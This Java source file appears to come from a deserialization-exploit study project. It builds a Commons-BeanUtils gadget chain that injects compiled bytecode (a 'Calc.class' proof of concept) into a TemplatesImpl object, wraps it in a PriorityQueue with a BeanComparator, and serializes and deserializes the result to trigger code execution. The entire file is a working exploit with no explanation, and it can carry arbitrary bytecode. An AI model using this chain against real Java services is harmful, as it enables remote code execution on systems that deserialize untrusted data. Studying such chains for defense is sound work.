package exp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static tools.Decode.unserializeBase64Decode;
import static tools.Encode.serializeBase64Encode;
import static tools.SetField.setField;

public class CB {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "CB");
        byte[] code = Files.readAllBytes(Paths.get("src/main/java/classpoc/Calc.class"));
        byte[][] codes = {code};
        setField(templates, "_bytecodes",codes);
        setField(templates, "_tfactory",new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator();
        setField(beanComparator,"property","outputProperties");
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2,beanComparator);
        setField(priorityQueue,"size",2);
        setField(priorityQueue,"queue",new Object[]{templates, templates});
        serializeBase64Encode(priorityQueue);
        unserializeBase64Decode("ser.bin");
    }
}
